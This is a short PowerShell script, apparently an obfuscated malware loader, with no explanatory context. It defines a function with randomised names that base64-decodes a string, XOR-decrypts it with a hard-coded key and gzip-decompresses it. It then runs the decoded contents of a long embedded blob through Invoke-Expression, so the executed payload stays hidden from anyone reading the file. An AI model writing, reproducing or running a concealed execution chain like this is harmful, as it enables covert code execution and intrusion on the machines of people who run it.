$x9tdshpn5fbia63 = [System.Text.Encoding]::ascii
function qkizu8l4e2nxwp5abvmd7s0fh6t  {param($rfb9kiqtno6wcua )
  $yiq4nu1fat5z3cr = [System.Convert]::FromBase64String($rfb9kiqtno6wcua)
  $rx0oegi9vk63myf= $x9tdshpn5fbia63.GetBytes("9fxvg81jmw4a")
    $7xfsnyw1kb4ao63 = $yiq4nu1fat5z3cr
    $4gtj63ex7im0l5a = $(for ($d5ekljxws7vb6f3 = 0; $d5ekljxws7vb6f3 -lt $7xfsnyw1kb4ao63.length; ) {
        for ($qxz1y4al0r9go3b = 0; $qxz1y4al0r9go3b -lt $rx0oegi9vk63myf.length; $qxz1y4al0r9go3b++) {
            $7xfsnyw1kb4ao63[$d5ekljxws7vb6f3] -bxor $rx0oegi9vk63myf[$qxz1y4al0r9go3b]
            $d5ekljxws7vb6f3++
            if ($d5ekljxws7vb6f3 -ge $7xfsnyw1kb4ao63.Length) {
                $qxz1y4al0r9go3b = $rx0oegi9vk63myf.length
            }
        }
    })
	$q30tmpefi928ojk = New-Object System.IO.MemoryStream( , $4gtj63ex7im0l5a )

	    $bwztie5d4hrocky = New-Object System.IO.MemoryStream
        $7f9e3asrlu4yvnc = New-Object System.IO.Compression.GzipStream $q30tmpefi928ojk, ([IO.Compression.CompressionMode]::Decompress)
	    $7f9e3asrlu4yvnc.CopyTo( $bwztie5d4hrocky )
        $7f9e3asrlu4yvnc.Close()
		$q30tmpefi928ojk.Close()
		[byte[]] $umfak50vy4h23jd = $bwztie5d4hrocky.ToArray()
 $w0xvnub2oqd53li=$umfak50vy4h23jd
    return $w0xvnub2oqd53li
}
[byte[]]$ohlef3y1j5z2679=qkizu8l4e2nxwp5abvmd7s0fh6t $z0satxqc9fm6wlh
[System.Text.Encoding]::ascii.GetString((qkizu8l4e2nxwp5abvmd7s0fh6t "Ju1wdmc4MWppd7k0VAmaTnfGTfufaBjqaoegMsZoSwe4ePTHFBHdoXBMih0Bwgboqn5qTRIkEYefqEOTey0ZSVOpoxJRCdL4XqD22I5ISkMaYyd9HEiL0EtNYu4zAzmgLHUx1B0VUiVw6YJdm+jmrenEtQB8IrURIsMvW0ZGK5Jp6peoevBQbP5bizjLuimAC4hH6Pmq9Quhy5DLpk/iohbwbaVi0aiDfyhZMQYmmz3Vv5QuMdWcOVAzJ9I85h0j1DaBPq8/FKs/qMxsPTko36fbc+DFOCa71DJWzY+1G6uY8VeMQYNdSjyO17ljZumX/lWm9ck4qCaQ90BhkTCP8mMx7UlXeFPKXBTE7hGFDe4Y8cLNf86Orv8Z1NRnuWRiVC8u1FmVrzE08LD3BZc9DT2Z3zBmo577lg7DKKreCpYynga43J3w+o4yuQatUI/Btl34TYyj/J2eMoeNUISrCyqWukabbyMgzyOhP5nFq5+2x849LruDHLmS1y3WBYfF0+GV0cMSpJZ4I+O3w52FTIOxEwvFHBuE/ZAltI9ifHiDDdMUXap8lc9mhjwAvACAQLQ4OzN/58C+vfMmhKvALeu3UJZudmWCJ3Y88uu5edMv2ndlz7mpvaMxuRbBCmtWacc6u+yxO7pU2WXfAUMJmnV9j/+cxpokSvE5i2yf7mASUFD1EihaDBmIPS7Pea5mHzupdTqrBXhmHQQxKXMIFRxMyodiRHo7/LToX+9rUQdPQ4WY9QTkOUgdHV4fM2ByeC7FALGiLFdyAbsukxBIscXqLsJSN7oREU5Y9evjDW3xcPSpwfH8X7r7cazL6Ry+4t+u84W2as9qqPAUtBduJQOoFcu8Q/hxl1wajmgkcDtBHqYhKKtzYLWcqasKzQK4oJvns3kAcYm1XBHomqCaRfTsYCgLgqaHHjJR93w4sdzIXClrWkgLE0tNXnWLLVeRQM17WFy+y7qtGAtixbEYviAV+nCwrqtOwvvz/bnoizRX4GOfRjl/AdFLCvHiDYoUVLmnL6TD1YH4yMi6p79PALgixPwjkJJehaIXkd6W9AgkEiaxCSLkWOoZ4dD4VbIyAL0sdoSkNtb9BjetKdAvR/R45cs6J+y224aErBP6Z0yU0l8ih3YLHBux6cKXxtCDn+yydLO8QGJoNWt5VnkGcWk22TQoa3wrLXLIUZoMM7IGccmVkjad8EwOFkEak20Iw2+DboMTbm1tdw=="))|iex;